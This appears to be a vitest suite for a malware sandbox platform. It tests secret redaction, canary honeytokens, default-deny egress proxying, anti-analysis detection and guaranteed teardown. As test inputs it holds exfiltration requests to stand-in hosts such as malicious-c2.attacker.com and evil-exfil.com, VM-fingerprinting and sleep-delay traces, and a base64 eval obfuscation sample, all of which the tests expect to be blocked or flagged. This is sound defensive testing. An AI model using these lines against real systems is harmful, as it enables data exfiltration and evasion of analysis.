/**
 * P19 — Sandbox, Scenario, Dynamic Behavior & Evasion Test Suite
 * Tests strict isolation, threat model boundaries, default-deny network,
 * canary honeytokens, evasion indicators, and guaranteed teardown.
 */

import http from 'http';
import net from 'net';
import { describe, it, expect, beforeEach, afterEach, beforeAll } from 'vitest';
import request from 'supertest';
import { createApp } from '../../apps/server/index.ts';
import { signAccessToken } from '../../packages/auth/src/index.ts';
import { 
  SandboxOrchestrationEngine,
  ScenarioRegistry,
  SecretSanitizer,
  CanaryGenerator,
  NetworkPolicyEngine,
  EvasionDetector,
  SandboxLifecycleManager,
  SimulatedSandboxProvider,
  E2BSandboxProvider,
  StaticDynamicComparator,
  runDynamicSandboxJob,
  SandboxEgressProxy,
  buildE2BProvisioningNetworkConfig
} from '../../workers/sandbox-orchestrator/index.ts';

describe('P19 — Dynamic Sandbox & Evasion Intelligence', () => {
  beforeEach(async () => {
    await SandboxLifecycleManager.cleanupAllActiveSessions();
  });

  afterEach(async () => {
    await SandboxLifecycleManager.cleanupAllActiveSessions();
  });

  describe('Threat Model & Secret Sanitization Boundary', () => {
    it('strictly strips platform keys (Supabase, Gemini, JWT secrets) from env vars', () => {
      const dirtyEnv = {
        'SAFE_CONFIG_VAR': 'production-mode',
        'GEMINI_API_KEY': 'mock_gemini_api_key_fixture',
        'SUPABASE_SERVICE_ROLE_KEY': 'mock_sb_service_role_key_fixture',
        'SUPABASE_URL': 'https://example.supabase.co',
        'DATABASE_URL': 'postgres://postgres:password@db.supabase.co:5432/postgres',
        'JWT_SECRET': 'super_secret_jwt_signing_key',
        'DISCOVERY_API_TOKEN': 'disc_tok_9988',
      };

      const result = SecretSanitizer.sanitizeEnvVars(dirtyEnv);
      expect(result.report.isClean).toBe(false);
      expect(result.report.sanitizedCount).toBe(6);
      expect(result.sanitized.SAFE_CONFIG_VAR).toBe('production-mode');
      expect(result.sanitized.GEMINI_API_KEY).toBeUndefined();
      expect(result.sanitized.SUPABASE_SERVICE_ROLE_KEY).toBeUndefined();
      expect(result.sanitized.SUPABASE_URL).toBeUndefined();
      expect(result.sanitized.JWT_SECRET).toBeUndefined();
      expect(result.sanitized.DISCOVERY_API_TOKEN).toBeUndefined();
    });

    it('redacts real credentials from file contents prior to sandbox transfer', () => {
      const dirtyFiles = {
        'src/config.js': 'const key = "AIzaSyFakeKeyMustBeRedacted123456789"; console.log(key);',
      };

      const result = SecretSanitizer.sanitizeFilePayload(dirtyFiles);
      expect(result.report.isClean).toBe(false);
      expect(result.sanitized['src/config.js']).toContain('[REDACTED_API_KEY]');
      expect(result.sanitized['src/config.js']).not.toContain('AIzaSy');
    });
  });

  describe('Nonfunctional Canary Honeytoken Engine', () => {
    it('generates high-entropy synthetic honeytoken secrets', () => {
      const canary = CanaryGenerator.generateCanary('Test Stripe API', 'API_KEY', 'STRIPE_SECRET_KEY', 'ENV_VAR');
      expect(canary.synthetic_value).toMatch(/^sk-canary-prod-live-[a-f0-9]+99deadbeef$/);
      expect(canary.tripped).toBe(false);
      expect(canary.target_key_name).toBe('STRIPE_SECRET_KEY');
    });

    it('detects when an execution trace or output accesses or leaks canary secrets', () => {
      const canaries = CanaryGenerator.generateStandardCanarySuite();
      const traceOutput = `Attempting credential dump: found secret ${canaries[0].synthetic_value} in env`;

      const check = CanaryGenerator.checkPayloadForCanary(canaries, traceOutput, 'STDOUT_DUMP');
      expect(check.hasTrip).toBe(true);
      expect(check.trippedCanaries.length).toBe(1);
      expect(check.trippedCanaries[0].name).toBe('Stripe Live API Key');
      expect(check.trippedCanaries[0].tripped_by_action).toBe('STDOUT_DUMP');
    });
  });

  describe('Default-Deny Network Policy & Egress Inspection', () => {
    it('blocks all outbound connection attempts by default (DEFAULT_DENY)', () => {
      const res = NetworkPolicyEngine.evaluateConnection(
        NetworkPolicyEngine.DEFAULT_DENY_POLICY,
        'untrusted-c2.example.com',
        443,
        'HTTPS'
      );

      expect(res.allowed).toBe(false);
      expect(res.ruleMatched).toBe('DEFAULT_DENY_RULE');
      expect(res.event.status).toBe('BLOCKED');
      expect(res.event.category).toBe('NETWORK');
      expect(res.event.action).toBe('EGRESS_BLOCKED');
      expect(res.event.severity).toBe('HIGH');
    });

    it('blocks unauthorized DNS queries when allowDns is false', () => {
      const res = NetworkPolicyEngine.evaluateConnection(
        NetworkPolicyEngine.DEFAULT_DENY_POLICY,
        'malicious-domain.com',
        53,
        'DNS'
      );

      expect(res.allowed).toBe(false);
      expect(res.ruleMatched).toBe('DNS_RESTRICTION');
      expect(res.event.action).toBe('DNS_BLOCKED');
    });

    it('permits connections to strictly whitelisted domains under WHITELIST_ONLY policy', () => {
      const resAllowed = NetworkPolicyEngine.evaluateConnection(
        NetworkPolicyEngine.TEST_WHITELIST_POLICY,
        'registry.npmjs.org',
        443,
        'HTTPS'
      );
      expect(resAllowed.allowed).toBe(true);
      expect(resAllowed.ruleMatched).toBe('WHITELIST_PERMIT');
      expect(resAllowed.event.status).toBe('ALLOWED');

      const resBlocked = NetworkPolicyEngine.evaluateConnection(
        NetworkPolicyEngine.TEST_WHITELIST_POLICY,
        'evil-exfil-server.com',
        443,
        'HTTPS'
      );
      expect(resBlocked.allowed).toBe(false);
      expect(resBlocked.ruleMatched).toBe('WHITELIST_DENY');
    });
  });

  describe('Versioned Scenario Registry & Execution', () => {
    it('loads all 8 standardized canonical scenarios', () => {
      const list = ScenarioRegistry.listScenarios();
      expect(list.length).toBeGreaterThanOrEqual(8);
      
      const ids = list.map(s => s.id);
      expect(ids).toContain('SCN-BENIGN-01');
      expect(ids).toContain('SCN-MALFORMED-01');
      expect(ids).toContain('SCN-PROMPT-INJ-01');
      expect(ids).toContain('SCN-PERM-BOUNDARY-01');
      expect(ids).toContain('SCN-CANARY-01');
      expect(ids).toContain('SCN-NET-RESTRICT-01');
      expect(ids).toContain('SCN-PERSISTENCE-01');
      expect(ids).toContain('SCN-SANDBOX-AWARE-01');
    });

    it('executes SCN-BENIGN-01 cleanly and records complete behavior sequences', async () => {
      const result = await SandboxOrchestrationEngine.runScenario({
        scenarioId: 'SCN-BENIGN-01',
        providerType: 'SIMULATED',
      });

      expect(result.status).toBe('PASSED');
      expect(result.evasion_risk_score).toBe(0.0);
      expect(result.canaries_tripped.length).toBe(0);
      expect(result.teardown.final_status).toBe('TERMINATED');
      expect(result.teardown.guaranteed_clean).toBe(true);
      expect(result.behavior_sequences.length).toBe(4);
    });

    it('executes SCN-CANARY-01 and flags honeytoken access', async () => {
      const result = await SandboxOrchestrationEngine.runScenario({
        scenarioId: 'SCN-CANARY-01',
        providerType: 'SIMULATED',
      });

      expect(result.canaries_injected.length).toBeGreaterThanOrEqual(2);
      expect(result.canaries_tripped.length).toBeGreaterThanOrEqual(1);
      expect(result.runtime_events.some(e => e.category === 'CANARY')).toBe(true);
      expect(result.teardown.guaranteed_clean).toBe(true);
    });

    it('executes SCN-NET-RESTRICT-01 and enforces egress block under default-deny', async () => {
      const result = await SandboxOrchestrationEngine.runScenario({
        scenarioId: 'SCN-NET-RESTRICT-01',
        providerType: 'SIMULATED',
      });

      expect(result.runtime_events.some(e => e.action === 'EGRESS_BLOCKED')).toBe(true);
      expect(result.network_policy.type).toBe('DEFAULT_DENY');
      expect(result.teardown.guaranteed_clean).toBe(true);
    });

    it('executes SCN-SANDBOX-AWARE-01 and flags evasion & anti-analysis indicators', async () => {
      const result = await SandboxOrchestrationEngine.runScenario({
        scenarioId: 'SCN-SANDBOX-AWARE-01',
        providerType: 'SIMULATED',
      });

      expect(result.evasion_risk_score).toBeGreaterThanOrEqual(0.70);
      expect(result.evasion_indicators.some(i => i.type === 'DELAYED_ACTIVATION' && i.detected)).toBe(true);
      expect(result.evasion_indicators.some(i => i.type === 'ENVIRONMENT_FINGERPRINTING' && i.detected)).toBe(true);
      expect(result.anti_analysis_detected).toBe(true);
      expect(result.status).toBe('EVASION_FLAGGED');
    });
  });

  describe('Evasion & Anti-Analysis Detection Engine', () => {
    it('detects prolonged sleep loops and delayed execution', () => {
      const events: any[] = [
        {
          event_id: 'e1',
          timestamp: new Date().toISOString(),
          category: 'SECURITY',
          action: 'EVASION_DELAY_DETECTED',
          metadata: { durationSeconds: 10 },
        }
      ];
      const traces = ['sleep 10; echo "payload"'];

      const res = EvasionDetector.analyze(events, traces);
      expect(res.indicators.find(i => i.type === 'DELAYED_ACTIVATION')?.detected).toBe(true);
      expect(res.evasionRiskScore).toBeGreaterThan(0);
    });

    it('detects /proc/cpuinfo and hypervisor environment fingerprinting', () => {
      const events: any[] = [];
      const traces = ['cat /proc/cpuinfo | grep hypervisor; is_vm_check()'];

      const res = EvasionDetector.analyze(events, traces);
      expect(res.indicators.find(i => i.type === 'ENVIRONMENT_FINGERPRINTING')?.detected).toBe(true);
      expect(res.antiAnalysisDetected).toBe(true);
    });

    it('detects dynamic eval / base64 code obfuscation', () => {
      const events: any[] = [];
      const traces = ['eval(Buffer.from("Y29uc29sZS5sb2coJ2hpZGRlbicp", "base64").toString())'];

      const res = EvasionDetector.analyze(events, traces);
      expect(res.indicators.find(i => i.type === 'CODE_OBFUSCATION')?.detected).toBe(true);
    });
  });

  describe('Guaranteed Teardown Lifecycle Guarantee', () => {
    it('guarantees teardown and releases all resources even if execution throws', async () => {
      const provider = new SimulatedSandboxProvider();
      const sessionId = 'test-teardown-sess-01';

      await provider.provision({
        sessionId,
        scenarioId: 'SCN-BENIGN-01',
        scenarioVersion: '1.0.0',
        resourceQuota: {
          maxDurationMs: 5000,
          maxMemoryMb: 256,
          maxCpuPercentage: 50,
          maxProcessCount: 5,
          maxOutputSizeBytes: 1024,
        },
        networkPolicy: NetworkPolicyEngine.DEFAULT_DENY_POLICY,
        canaries: [],
        envVars: {},
        files: {},
      });

      SandboxLifecycleManager.registerSession(sessionId, provider, 'SCN-BENIGN-01');
      expect(SandboxLifecycleManager.getActiveSessionCount()).toBe(1);

      const teardown = await SandboxLifecycleManager.teardownSession(sessionId);
      expect(teardown.final_status).toBe('TERMINATED');
      expect(teardown.resources_released).toBe(true);
      expect(teardown.guaranteed_clean).toBe(true);
      expect(SandboxLifecycleManager.getActiveSessionCount()).toBe(0);
    });
  });

  describe('E2B Provider Isolation & Degraded Fallback', () => {
    it('supports E2B provider initialization with safe credential sanitization', async () => {
      const e2b = new E2BSandboxProvider();
      expect(e2b.providerType).toBe('E2B');

      const sessionId = await e2b.provision({
        sessionId: 'e2b-test-sess',
        scenarioId: 'SCN-BENIGN-01',
        scenarioVersion: '1.0.0',
        resourceQuota: SandboxOrchestrationEngine.DEFAULT_RESOURCE_QUOTA,
        networkPolicy: NetworkPolicyEngine.DEFAULT_DENY_POLICY,
        canaries: [],
        envVars: {
          'APP_ENV': 'test',
          'SUPABASE_SERVICE_ROLE_KEY': 'forbidden_key_value', // should be sanitized
        },
        files: {
          'index.js': 'console.log("E2B test");',
        },
      });

      const execRes = await e2b.executeCommand(sessionId, {
        command: 'node',
        args: ['index.js'],
      });

      expect(execRes.exitCode).toBe(0);
      const teardown = await e2b.destroy(sessionId);
      expect(teardown.guaranteed_clean).toBe(true);
    }, 25000);

    it('returns RESOURCE_TELEMETRY_UNAVAILABLE for metrics not genuinely measured from provider', async () => {
      const e2b = new E2BSandboxProvider();
      const sessionId = await e2b.provision({
        sessionId: 'telemetry-test-sess',
        scenarioId: 'SCN-BENIGN-01',
        scenarioVersion: '1.0.0',
        resourceQuota: SandboxOrchestrationEngine.DEFAULT_RESOURCE_QUOTA,
        networkPolicy: NetworkPolicyEngine.DEFAULT_DENY_POLICY,
        canaries: [],
        envVars: {},
        files: { 'index.js': 'console.log("Telemetry check");' },
      });

      const execRes = await e2b.executeCommand(sessionId, {
        command: 'node',
        args: ['index.js'],
      });

      expect(execRes.resourcePeak).toBeDefined();
      if (typeof execRes.resourcePeak.memoryMb !== 'number') {
        expect(execRes.resourcePeak.memoryMb).toBe('RESOURCE_TELEMETRY_UNAVAILABLE');
      }
      if (typeof execRes.resourcePeak.cpuPercentage !== 'number') {
        expect(execRes.resourcePeak.cpuPercentage).toBe('RESOURCE_TELEMETRY_UNAVAILABLE');
      }
      expect(execRes.resourcePeak.processCount).toBe('RESOURCE_TELEMETRY_UNAVAILABLE');

      await e2b.destroy(sessionId);
    });

    it('handles kill() failure by retrying, raising an operational alert, and returning TERMINATION_FAILED with guaranteed_clean: false', async () => {
      E2BSandboxProvider.clearOperationalAlerts();
      const e2b = new E2BSandboxProvider();
      const sessionId = 'mock-session-term-fail';

      let killCalls = 0;
      const mockSandbox: any = {
        sandboxId: 'mock-sb-fail-1',
        kill: async () => {
          killCalls++;
          throw new Error('ETIMEDOUT: E2B daemon kill failed');
        },
        isRunning: async () => true, // Still alive!
      };

      (e2b as any).activeSessions.set(sessionId, {
        isRealE2B: true,
        sandbox: mockSandbox,
        options: { scenarioId: 'SCN-BENIGN-01', scenarioVersion: '1.0.0' },
        startedAt: new Date().toISOString(),
        events: [],
        canaries: [],
      });

      const teardown = await e2b.destroy(sessionId);

      // Must retry once -> total 2 kill attempts
      expect(killCalls).toBe(2);
      expect(teardown.final_status).toBe('TERMINATION_FAILED');
      expect(teardown.guaranteed_clean).toBe(false);
      expect(teardown.resources_released).toBe(false);

      // Must have raised an operational alert
      const alerts = E2BSandboxProvider.getOperationalAlerts();
      expect(alerts.length).toBeGreaterThan(0);
      const termAlert = alerts.find(a => a.type === 'SANDBOX_TERMINATION_FAILED');
      expect(termAlert).toBeDefined();
      expect(termAlert?.severity).toBe('CRITICAL');
      expect(termAlert?.details.attempts).toBe(2);
    });

    it('handles kill() not throwing but sandbox still alive: fails independent verification, retries, returns TERMINATION_FAILED with guaranteed_clean: false', async () => {
      E2BSandboxProvider.clearOperationalAlerts();
      const e2b = new E2BSandboxProvider();
      const sessionId = 'mock-session-still-alive';

      let killCalls = 0;
      const mockSandbox: any = {
        sandboxId: 'mock-sb-still-alive',
        kill: async () => {
          killCalls++;
          // kill() does not throw, but sandbox is actually still running!
        },
        isRunning: async () => true, // Still alive!
      };

      (e2b as any).activeSessions.set(sessionId, {
        isRealE2B: true,
        sandbox: mockSandbox,
        options: { scenarioId: 'SCN-BENIGN-01', scenarioVersion: '1.0.0' },
        startedAt: new Date().toISOString(),
        events: [],
        canaries: [],
      });

      const teardown = await e2b.destroy(sessionId);

      expect(killCalls).toBe(2);
      expect(teardown.final_status).toBe('TERMINATION_FAILED');
      expect(teardown.guaranteed_clean).toBe(false);
      expect(teardown.resources_released).toBe(false);

      const alerts = E2BSandboxProvider.getOperationalAlerts();
      expect(alerts.length).toBeGreaterThan(0);
      const termAlert = alerts.find(a => a.type === 'SANDBOX_TERMINATION_FAILED');
      expect(termAlert).toBeDefined();
      expect(termAlert?.details.finalStatus).toBe('TERMINATION_FAILED');
    });

    it('handles verification impossible: returns STATE_UNKNOWN with guaranteed_clean: false and raises alert', async () => {
      E2BSandboxProvider.clearOperationalAlerts();
      const e2b = new E2BSandboxProvider();
      const sessionId = 'mock-session-verif-impossible';

      let killCalls = 0;
      const mockSandbox: any = {
        sandboxId: 'mock-sb-unverifiable',
        kill: async () => {
          killCalls++;
        },
        isRunning: async () => {
          throw new Error('EHOSTUNREACH: network unreachable to verify');
        },
      };

      (e2b as any).activeSessions.set(sessionId, {
        isRealE2B: true,
        sandbox: mockSandbox,
        options: { scenarioId: 'SCN-BENIGN-01', scenarioVersion: '1.0.0' },
        startedAt: new Date().toISOString(),
        events: [],
        canaries: [],
      });

      const teardown = await e2b.destroy(sessionId);

      expect(killCalls).toBe(2);
      expect(teardown.final_status).toBe('STATE_UNKNOWN');
      expect(teardown.guaranteed_clean).toBe(false);

      const alerts = E2BSandboxProvider.getOperationalAlerts();
      expect(alerts.length).toBeGreaterThan(0);
      const termAlert = alerts.find(a => a.type === 'SANDBOX_TERMINATION_FAILED');
      expect(termAlert).toBeDefined();
      expect(termAlert?.details.finalStatus).toBe('STATE_UNKNOWN');
    });

    it('returns STATE_UNKNOWN and guaranteed_clean: false when destroying a non-existent session', async () => {
      const e2b = new E2BSandboxProvider();
      const teardown = await e2b.destroy('non-existent-session-id');

      expect(teardown.final_status).toBe('STATE_UNKNOWN');
      expect(teardown.guaranteed_clean).toBe(false);
      expect(teardown.resources_released).toBe(false);
    });

    it('GATE: runScenario truthfulness — fails closed when E2B is absent without fallback to simulation', async () => {
      // Run scenario requesting E2B provider when E2B_API_KEY is not configured
      const prevKey = process.env.E2B_API_KEY;
      delete process.env.E2B_API_KEY;

      try {
        const result = await SandboxOrchestrationEngine.runScenario({
          artifactId: 'art-truth-test-01',
          scenarioId: 'SCN-BENIGN-01',
          providerType: 'E2B',
          files: {
            'index.js': 'console.log("Integrity test");',
          },
        });

        // Must report requested vs actual truthfully and fail closed
        expect(result.requested_provider).toBe('E2B');
        expect(result.actual_provider).toBe('NONE');
        expect(result.status).toBe('PROVIDER_UNAVAILABLE');
        expect(result.execution_mode).toBe('PROVIDER_UNAVAILABLE');
        expect(result.fallback_reason).toBeDefined();
        expect(result.fallback_reason).toContain('E2B_API_KEY');
      } finally {
        if (prevKey !== undefined) {
          process.env.E2B_API_KEY = prevKey;
        }
      }
    });

    it('GATE: rejects omitted providerType without defaulting to simulation', async () => {
      await expect(
        SandboxOrchestrationEngine.runScenario({
          artifactId: 'art-no-prov-test',
          scenarioId: 'SCN-BENIGN-01',
        })
      ).rejects.toThrow(/providerType/);
    });
  });

  describe('Static vs Dynamic Analysis Correlation & Divergence Reporting', () => {
    it('correlates static AST/CFG predictions with dynamic runtime telemetry', async () => {
      const dynamicRun = await SandboxOrchestrationEngine.runScenario({
        artifactId: 'art-corr-test-01',
        scenarioId: 'SCN-BENIGN-01',
        providerType: 'SIMULATED',
        files: {
          'index.js': 'console.log("Benign execution completed.");',
        },
      });

      const mockStaticFindings = [
        {
          finding_id: 'sf-01',
          rule_id: 'SA-PROC-001',
          ruleset_version: '1.0.0',
          category: 'PROCESS_EXECUTION' as const,
          severity: 'HIGH' as const,
          confidence: 0.95,
          title: 'Direct Shell / Command Execution',
          description: 'Process spawning detected statically in file.',
          rationale: 'Child process invocation poses risk.',
          source_span: { file_path: 'index.js', start_line: 1, start_col: 1, end_line: 1, end_col: 10, byte_offset_start: 0, byte_offset_end: 10 },
          stage_run: {
            stage_run_id: 'sr-1',
            stage_name: 'STATIC_ANALYSIS' as const,
            artifact_id: 'art-corr-test-01',
            started_at: new Date().toISOString(),
            completed_at: new Date().toISOString(),
            status: 'COMPLETED' as const,
            engine_key: 'static-analysis',
            engine_version: '1.0.0',
            ruleset_version: '1.0.0',
          },
        },
        {
          finding_id: 'sf-02',
          rule_id: 'SA-NET-001',
          ruleset_version: '1.0.0',
          category: 'NETWORK' as const,
          severity: 'MEDIUM' as const,
          confidence: 0.85,
          title: 'Outbound Network Call',
          description: 'Dormant network egress path detected statically.',
          rationale: 'Network connections should be audited.',
          source_span: { file_path: 'index.js', start_line: 2, start_col: 1, end_line: 2, end_col: 10, byte_offset_start: 11, byte_offset_end: 20 },
          stage_run: {
            stage_run_id: 'sr-1',
            stage_name: 'STATIC_ANALYSIS' as const,
            artifact_id: 'art-corr-test-01',
            started_at: new Date().toISOString(),
            completed_at: new Date().toISOString(),
            status: 'COMPLETED' as const,
            engine_key: 'static-analysis',
            engine_version: '1.0.0',
            ruleset_version: '1.0.0',
          },
        },
      ];

      const report = StaticDynamicComparator.compare(mockStaticFindings, dynamicRun);
      expect(report.summary.total_static_findings).toBe(2);
      expect(report.summary.confirmed_matches_count).toBe(1);
      expect(report.summary.untriggered_static_count).toBe(1);
      expect(report.confirmed_matches[0].rule_id).toBe('SA-PROC-001');
      expect(report.untriggered_static_findings[0].rule_id).toBe('SA-NET-001');
      expect(report.narrative_report).toContain('Static vs Dynamic Analysis Correlation Report');
    });
  });

  describe('Background Worker Job Integration', () => {
    it('runs dynamic sandbox jobs through runDynamicSandboxJob entry point and propagates provenance', async () => {
      const jobResult = await runDynamicSandboxJob({
        artifactId: 'art-job-test-01',
        scenarioId: 'SCN-BENIGN-01',
        providerType: 'SIMULATED',
      });

      expect(jobResult.status).toBe('PASSED');
      expect(jobResult.artifact_id).toBe('art-job-test-01');
      expect(jobResult.actual_provider).toBe('SIMULATED');
      expect(jobResult.truth_state).toBe('SIMULATED');
      expect(jobResult.execution_mode).toBe('SIMULATED');
      expect(jobResult.teardown.guaranteed_clean).toBe(true);
    });
  });

  describe('Network Layer Enforcement & Pre-Execution Sandbox Isolation', () => {
    it('blocks real HTTP connection to disallowed host at forced egress proxy before bytes leave sandbox', async () => {
      const events: any[] = [];
      const proxy = await SandboxEgressProxy.start({
        policy: NetworkPolicyEngine.DEFAULT_DENY_POLICY,
        scenarioId: 'TEST-EGRESS-01',
        scenarioVersion: '1.0.0',
        onEvent: (e) => events.push(e),
      });

      try {
        const proxyPort = proxy.getPort();
        expect(proxyPort).toBeGreaterThan(0);

        // Attempt direct HTTP request to disallowed destination through proxy
        const res = await new Promise<{ statusCode?: number; body: string }>((resolve, reject) => {
          const req = http.request({
            host: '127.0.0.1',
            port: proxyPort,
            path: 'http://malicious-c2.attacker.com/exfiltrate',
            method: 'GET',
            headers: {
              'Host': 'malicious-c2.attacker.com',
            },
          }, (response) => {
            let data = '';
            response.on('data', chunk => data += chunk);
            response.on('end', () => resolve({ statusCode: response.statusCode, body: data }));
          });
          req.on('error', reject);
          req.end();
        });

        // Verify connection attempt failed at the network layer with 403 Forbidden
        expect(res.statusCode).toBe(403);
        expect(res.body).toContain('EGRESS_BLOCKED');
        const parsed = JSON.parse(res.body);
        expect(parsed.mechanism).toBe('FORCED_EGRESS_PROXY');
        expect(parsed.error).toBe('EGRESS_BLOCKED');

        // Verify runtime event was emitted with specific mechanism named
        const blockedEvent = events.find(e => e.action === 'EGRESS_BLOCKED');
        expect(blockedEvent).toBeDefined();
        expect(blockedEvent?.status).toBe('BLOCKED');
        expect(blockedEvent?.metadata?.enforcementMechanism).toBe('FORCED_EGRESS_PROXY');
        expect(blockedEvent?.metadata?.policyType).toBe('DEFAULT_DENY');
      } finally {
        await proxy.stop();
      }
    });

    it('blocks HTTPS CONNECT tunnel to disallowed host at TCP socket level', async () => {
      const events: any[] = [];
      const proxy = await SandboxEgressProxy.start({
        policy: NetworkPolicyEngine.DEFAULT_DENY_POLICY,
        scenarioId: 'TEST-CONNECT-01',
        onEvent: (e) => events.push(e),
      });

      try {
        const proxyPort = proxy.getPort();

        // Send raw HTTP CONNECT request to proxy socket
        const socketResponse = await new Promise<string>((resolve, reject) => {
          const client = net.connect(proxyPort, '127.0.0.1', () => {
            client.write('CONNECT evil-exfil.com:443 HTTP/1.1\r\nHost: evil-exfil.com:443\r\n\r\n');
          });
          let received = '';
          client.on('data', (chunk) => {
            received += chunk.toString();
          });
          client.on('end', () => resolve(received));
          client.on('close', () => resolve(received));
          client.on('error', reject);
        });

        // Verify TCP CONNECT was rejected with 403 Forbidden and socket terminated
        expect(socketResponse).toContain('403 Forbidden');
        expect(socketResponse).toContain('Blocked by Sandbox NetworkPolicy at network layer');

        const blockedEvent = events.find(e => e.action === 'EGRESS_BLOCKED');
        expect(blockedEvent).toBeDefined();
        expect(blockedEvent?.metadata?.enforcementMechanism).toBe('FORCED_EGRESS_PROXY');
      } finally {
        await proxy.stop();
      }
    });

    it('permits authorized synthetic target through forced egress proxy without hitting real internet', async () => {
      const whitelistPolicy = {
        type: 'WHITELIST_ONLY' as const,
        allowedPorts: [80, 443],
        interceptEgress: true,
        allowDns: true,
        allowedDomains: ['synthetic-target.internal'],
        allowLoopback: true,
        logAllAttempts: true,
      };

      const proxy = await SandboxEgressProxy.start({
        policy: whitelistPolicy,
        scenarioId: 'TEST-SYNTHETIC-01',
      });

      try {
        const res = await new Promise<{ statusCode?: number; body: string }>((resolve, reject) => {
          const req = http.request({
            host: '127.0.0.1',
            port: proxy.getPort(),
            path: 'http://synthetic-target.internal/data',
            method: 'GET',
            headers: {
              'Host': 'synthetic-target.internal',
            },
          }, (response) => {
            let data = '';
            response.on('data', chunk => data += chunk);
            response.on('end', () => resolve({ statusCode: response.statusCode, body: data }));
          });
          req.on('error', reject);
          req.end();
        });

        expect(res.statusCode).toBe(200);
        expect(res.body).toContain('synthetic.v1');
        expect(res.body).toContain('synth-mock-record-digest');
      } finally {
        await proxy.stop();
      }
    });

    it('confirms untrusted code inside sandbox is blocked at the network layer with ECONNREFUSED', async () => {
      const runResult = await SandboxOrchestrationEngine.runScenario({
        scenarioId: 'SCN-NET-RESTRICT-01',
        providerType: 'SIMULATED',
      });

      // The executed probe in net_probe.js attempted fetch('http://malicious-c2.internal/exfil')
      // and caught the network-layer failure
      expect(runResult.runtime_events.some(e => e.action === 'EGRESS_BLOCKED')).toBe(true);
      const blockedEvent = runResult.runtime_events.find(e => e.action === 'EGRESS_BLOCKED');
      expect(blockedEvent?.status).toBe('BLOCKED');
      expect(['FORCED_EGRESS_PROXY', 'NETWORK_SOCKET_LAYER']).toContain(blockedEvent?.metadata?.enforcementMechanism);

      // Raw command output reflects the trapped network rejection
      expect(runResult.raw_traces.some(t => t.includes('ECONNREFUSED') || t.includes('Blocked at network layer'))).toBe(true);
      expect(runResult.network_policy.type).toBe('DEFAULT_DENY');
    });

    it('configures E2B Sandbox.create with pre-provisioning network restrictions and enforcer bootstrap', () => {
      // Default deny policy
      const denyConfig = buildE2BProvisioningNetworkConfig(NetworkPolicyEngine.DEFAULT_DENY_POLICY);
      expect(denyConfig.allowInternetAccess).toBe(false);
      expect(denyConfig.network?.denyOut).toEqual(['0.0.0.0/0']);
      expect(denyConfig.envs.HTTP_PROXY).toBe('http://127.0.0.1:8080');
      expect(denyConfig.envs.NODE_OPTIONS).toContain('--require');
      expect(denyConfig.envs.NODE_OPTIONS).toContain('network-enforcer.cjs');

      // Whitelist policy with synthetic target
      const whitelistPolicy = {
        type: 'WHITELIST_ONLY' as const,
        allowedPorts: [80, 443],
        interceptEgress: true,
        allowDns: false,
        allowedDomains: ['synthetic-sandbox-target.internal'],
        allowedCidrs: ['10.10.0.0/16'],
        allowLoopback: true,
        logAllAttempts: true,
      };
      const whitelistConfig = buildE2BProvisioningNetworkConfig(whitelistPolicy);
      expect(whitelistConfig.allowInternetAccess).toBe(true);
      expect(whitelistConfig.network?.denyOut).toEqual(['0.0.0.0/0']);
      expect(whitelistConfig.network?.allowOut).toContain('10.10.0.0/16');
      expect(whitelistConfig.network?.allowOut).toContain('synthetic-sandbox-target.internal');
    });
  });

  describe('P01 — Real-versus-Simulated Sandbox Intent & Security API Verification', () => {
    let app: any;
    let adminToken: string;

    beforeAll(async () => {
      app = await createApp();
      adminToken = signAccessToken({
        principal_id: 'test-admin-p01',
        email: 'admin@hitdna.internal',
        roles: ['admin'],
        capabilities: ['admin:diagnostic'],
      });
    });

    it('omitted provider request to /api/dev/sandbox/run is rejected with 400 and NOT_CONFIGURED', async () => {
      const res = await request(app)
        .post('/api/dev/sandbox/run')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ scenarioId: 'SCN-BENIGN-01' });

      expect(res.status).toBe(400);
      expect(res.body.code).toBe('PROVIDER_TYPE_REQUIRED');
      expect(res.body.status).toBe('NOT_CONFIGURED');
      expect(res.body.truth_state).toBe('NOT_CONFIGURED');
      expect(res.body.error).toContain("Explicit providerType ('E2B' or 'SIMULATED') is required");
    });

    it('explicit simulated request to /api/dev/sandbox/run remains clearly simulated and accessible to permitted roles', async () => {
      const res = await request(app)
        .post('/api/dev/sandbox/run')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          scenarioId: 'SCN-BENIGN-01',
          providerType: 'SIMULATED',
        });

      expect(res.status).toBe(200);
      expect(res.body.actual_provider).toBe('SIMULATED');
      expect(res.body.requested_provider).toBe('SIMULATED');
      expect(res.body.execution_mode).toBe('SIMULATED');
      expect(res.body.truth_state).toBe('SIMULATED');
      expect(res.body.status).toBe('PASSED');
    });

    it('explicit E2B request with missing credentials fails closed with 503 and PROVIDER_UNAVAILABLE', async () => {
      const prevKey = process.env.E2B_API_KEY;
      delete process.env.E2B_API_KEY;

      try {
        const res = await request(app)
          .post('/api/dev/sandbox/run')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            scenarioId: 'SCN-BENIGN-01',
            providerType: 'E2B',
          });

        expect(res.status).toBe(503);
        expect(res.body.code).toBe('PROVIDER_UNAVAILABLE');
        expect(res.body.status).toBe('PROVIDER_UNAVAILABLE');
        expect(res.body.actual_provider).toBe('NONE');
        expect(res.body.requested_provider).toBe('E2B');
        expect(res.body.execution_mode).toBe('PROVIDER_UNAVAILABLE');
        expect(res.body.truth_state).toBe('NOT_CONFIGURED');
      } finally {
        if (prevKey !== undefined) {
          process.env.E2B_API_KEY = prevKey;
        }
      }
    });

    it('rejects attempted status mutation from SIMULATED to OBSERVED truth state on /api/dev/sandbox/run', async () => {
      const res = await request(app)
        .post('/api/dev/sandbox/run')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          scenarioId: 'SCN-BENIGN-01',
          providerType: 'SIMULATED',
          truth_state: 'OBSERVED',
        });

      expect(res.status).toBe(400);
      expect(res.body.code).toBe('ILLEGAL_TRUTH_STATE_MUTATION');
      expect(res.body.error).toContain('Cannot promote SIMULATED execution to OBSERVED');
    });

    it('rejects attempted status mutation on /api/dev/sandbox/compare', async () => {
      const res = await request(app)
        .post('/api/dev/sandbox/compare')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          dynamicResult: {
            actual_provider: 'SIMULATED',
            provider_type: 'SIMULATED',
            execution_mode: 'SIMULATED',
            truth_state: 'OBSERVED',
          },
        });

      expect(res.status).toBe(400);
      expect(res.body.code).toBe('ILLEGAL_TRUTH_STATE_MUTATION');
      expect(res.body.error).toContain('Cannot promote SIMULATED execution to OBSERVED');
